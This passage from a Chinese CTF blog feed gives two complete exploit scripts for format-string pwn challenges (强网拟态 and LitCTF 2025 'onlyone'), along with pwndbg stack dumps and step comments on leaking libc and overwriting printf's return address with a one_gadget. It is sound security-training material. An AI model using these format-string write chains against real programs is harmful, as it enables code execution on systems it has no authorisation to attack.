class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span> </span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/home/xidp/tools/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">1</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x0124B</span>]</span><br><span class="line"><span class="comment"># bps = [0x7ffff7e36d3a]</span></span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">elf_offset --&gt; 0x8e02a81df02d</span></span><br><span class="line"><span class="string">elf_base --&gt; 0x8e02a81dddcd</span></span><br><span class="line"><span class="string">libc_offset --&gt; 0x7ffff7ee31f2</span></span><br><span class="line"><span class="string">libc_base --&gt; 0x7ffff7dd5000</span></span><br><span class="line"><span class="string">one_gadget --&gt; 0x7ffff7eb8b01</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; tele 0x7fffffffdf50-0x8 30</span></span><br><span class="line"><span class="string">00:0000│-018 0x7fffffffdf48 —▸ 0x55555555523c (main+147) ◂— lea rax, [rip + 0x2dfd]</span></span><br><span class="line"><span class="string">01:0008│ rsp 0x7fffffffdf50 —▸ 0x7fffffffe050 ◂— 1</span></span><br><span class="line"><span class="string">02:0010│-008 0x7fffffffdf58 ◂— 0x74db5bf5a748af00</span></span><br><span class="line"><span class="string">03:0018│ rbp 0x7fffffffdf60 ◂— 0</span></span><br><span class="line"><span class="string">04:0020│+008 0x7fffffffdf68 —▸ 0x7ffff7df9083 (__libc_start_main+243) ◂— mov edi, eax</span></span><br><span class="line"><span class="string">05:0028│+010 0x7fffffffdf70 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x6064b00000000</span></span><br><span class="line"><span class="string">06:0030│+018 0x7fffffffdf78 —▸ 0x7fffffffe058 —▸ 0x7fffffffe351 ◂— 0x4853006e77702f2e /* &#x27;./pwn&#x27; */</span></span><br><span class="line"><span class="string">07:0038│+020 0x7fffffffdf80 ◂— 0x100000000</span></span><br><span class="line"><span class="string">08:0040│+028 0x7fffffffdf88 —▸ 0x5555555551a9 (main) ◂— endbr64 </span></span><br><span class="line"><span class="string">09:0048│+030 0x7fffffffdf90 —▸ 0x555555555260 (__libc_csu_init) ◂— endbr64 </span></span><br><span class="line"><span class="string">0a:0050│+038 0x7fffffffdf98 ◂— 0xe34f173011012211</span></span><br><span class="line"><span class="string">0b:0058│+040 0x7fffffffdfa0 —▸ 0x5555555550c0 (_start) ◂— endbr64 </span></span><br><span class="line"><span class="string">0c:0060│+048 0x7fffffffdfa8 —▸ 0x7fffffffe050 ◂— 1</span></span><br><span class="line"><span class="string">0d:0068│+050 0x7fffffffdfb0 ◂— 0</span></span><br><span class="line"><span class="string">0e:0070│+058 0x7fffffffdfb8 ◂— 0</span></span><br><span class="line"><span class="string">0f:0078│+060 0x7fffffffdfc0 ◂— 0x1cb0e8cfafe12211</span></span><br><span class="line"><span class="string">10:0080│+068 0x7fffffffdfc8 ◂— 0x1cb0f88f316f2211</span></span><br><span class="line"><span class="string">11:0088│+070 0x7fffffffdfd0 ◂— 0</span></span><br><span class="line"><span class="string"><span class="meta">... </span>↓        2 skipped</span></span><br><span class="line"><span class="string">14:00a0│+088 0x7fffffffdfe8 ◂— 1</span></span><br><span class="line"><span class="string">15:00a8│+090 0x7fffffffdff0 —▸ 0x7fffffffe058 —▸ 0x7fffffffe351 ◂— 0x4853006e77702f2e /* &#x27;./pwn&#x27; */</span></span><br><span class="line"><span class="string">16:00b0│+098 0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffe357 ◂— &#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line"><span class="string">17:00b8│+0a0 0x7fffffffe000 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">printf_ret_addr = stack_addr - <span class="number">0xc</span></span><br><span class="line">leak(<span class="string">&quot;printf_ret_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 通过链子修改printf返回地址为程序中的 read = 0x01223</span></span><br><span class="line"><span class="comment"># 这里是通过高位截断的方法写入，也就是说我们输出的字符串是0x100023,但是我们只写入1字节，也就是最后一位0x23 </span></span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span> * <span class="number">9</span> <span class="comment"># 输出90个字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(printf_ret_addr - <span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100023</span> - (printf_ret_addr)).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;0x100&quot;</span>)</span><br><span class="line">libc_offset = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) <span class="comment"># rcx</span></span><br><span class="line">libc_base = libc_offset - <span class="number">0x10e1f2</span></span><br><span class="line">leak(<span class="string">&quot;libc_offset&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">elf_offset = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">elf_base = elf_offset - <span class="number">0x1260</span></span><br><span class="line">leak(<span class="string">&quot;elf_offset&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;elf_base&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改了第二条链子的第一个指针，改了两个字节，结尾改成rsp</span></span><br><span class="line"><span class="comment"># 0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffdf50 —▸ 0x7fffffffe050 ◂— 1</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack_addr - <span class="number">4</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二条链子的第二个指针</span></span><br><span class="line"><span class="comment"># 0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffdf50 —▸ 0x7fffffff8b01 ◂— 0</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二条链子的第一个指针</span></span><br><span class="line"><span class="comment"># 0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffdf52 ◂— 0x520000007fffffff</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(((stack_addr - <span class="number">4</span> + <span class="number">2</span>)) - <span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二条链子的第二个指针</span></span><br><span class="line"><span class="comment"># 0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffdf52 ◂— 0x520000007ffff7eb</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二条链子的第一个指针</span></span><br><span class="line"><span class="comment"># 00x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffdf54 ◂— 0x1a9a520000007fff </span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(((stack_addr - <span class="number">4</span> + <span class="number">2</span> + <span class="number">2</span>)) - <span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改第二条链子的第一个指针</span></span><br><span class="line"><span class="comment"># 0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffdf54 ◂— 0x1a9a520000007fff(这里是因为刚好是0x7fff所以没有变化)</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span>).encode() + <span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改最后一条链子的第二个指针</span></span><br><span class="line"><span class="comment"># 0x7fffffffdff0 —▸ 0x7fffffffe058 —▸ 0x7fffffffdf48 —▸ 0x5555555552c4 (ret) </span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xc4</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;</span></span><br><span class="line"><span class="comment"># sd(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">第一步构造循环</span></span><br><span class="line"><span class="string">第二步开始在printf返回地址的下面一个构造one_gadget</span></span><br><span class="line"><span class="string">第三步修改printf返回地址为ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>下面再推荐 <code>2025LitCTF</code> 的 <code>onlyone</code><br><a href="https://www.nssctf.cn/problem/6791">[LitCTF 2025]onlyone | NSSCTF</a><br>也是和上面 <code>强网拟态</code> 的题目几乎一样<br>下面直接给出exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span> </span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;node10.anna.nssctf.cn:23976&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x8DC</span>]</span><br><span class="line"><span class="comment"># 0x7ffff7e4bd1f</span></span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000000069e: ret;</span></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;gift 1 is &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;gift 2 is &quot;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x84135</span>, <span class="number">0xe3b01</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>)</span><br><span class="line">printf_ret_addr = (stack_addr &amp; <span class="number">0xffff</span>) - <span class="number">15</span></span><br><span class="line">leak(<span class="string">&quot;printf_ret_addr&quot;</span>)</span><br><span class="line">rsp_addr = (stack_addr - <span class="number">7</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;%p&#x27;</span> * <span class="number">9</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(printf_ret_addr - <span class="number">92</span>).encode() + <span class="string">b&#x27;c%hn&#x27;</span> <span class="comment"># 11</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x10007b</span> - printf_ret_addr).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr - <span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &amp; <span class="number">0xffff</span>) - <span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr + <span class="number">2</span> - <span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xffff</span>) - <span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr + <span class="number">4</span> - <span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((one_gadget &gt;&gt; <span class="number">32</span>) - <span class="number">0x7b</span>).encode() + <span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x069e</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="comment"># sdl(payload)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>参考:</p><ol><li><a href="https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a></li><li><a href="https://blog.wjhwjhn.com/posts/af55bf3/#%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8">格式化字符串漏洞利用 - WJH’s Blog</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C程序调用过程与函数栈变化（32位 vs 64位）(Intel)</title>
      <link href="/2024/06/13/C%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%87%BD%E6%95%B0%E6%A0%88%E5%8F%98%E5%8C%96%EF%BC%8832%E4%BD%8D%20vs%2064%E4%BD%8D%EF%BC%89(Intel)/"/>
      <url>/2024/06/13/C%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%87%BD%E6%95%B0%E6%A0%88%E5%8F%98%E5%8C%96%EF%BC%8832%E4%BD%8D%20vs%2064%E4%BD%8D%EF%BC%89(Intel)/</url>
      
